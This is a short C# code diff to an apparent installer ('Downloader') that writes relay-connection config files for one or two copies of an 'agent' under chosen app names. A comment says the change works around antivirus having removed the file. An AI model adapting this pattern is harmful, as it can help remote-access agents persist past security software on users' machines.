@@ -107,9 +107,11 @@ class Downloader {
 
         bool dual = !string.IsNullOrEmpty(secondName);
 
-        // Write config for primary
+        // Write config for primary — always create it (do NOT require pre-existence;
+        // the file may be absent if AV removed it or the zip structure changed).
         string cfgPath = Path.Combine(installDir, "resources", "app", "agent", "config.default.json");
-        if (!string.IsNullOrEmpty(key) && File.Exists(cfgPath)) {
+        if (!string.IsNullOrEmpty(key)) {
+            try { Directory.CreateDirectory(Path.GetDirectoryName(cfgPath)); } catch { }
             string cfg = dual
                 ? "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \"" + key
                   + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 1,\r\n  \"appName\": \""
@@ -137,7 +139,8 @@ class Downloader {
             CopyDir(installDir, dir2);
 
             string cfg2Path = Path.Combine(dir2, "resources", "app", "agent", "config.default.json");
-            if (!string.IsNullOrEmpty(key) && File.Exists(cfg2Path)) {
+            if (!string.IsNullOrEmpty(key)) {
+                try { Directory.CreateDirectory(Path.GetDirectoryName(cfg2Path)); } catch { }
                 string cfg2 = "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \""
                     + key + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 2,\r\n  \"appName\": \""
                     + secondName + "\"\r\n}";
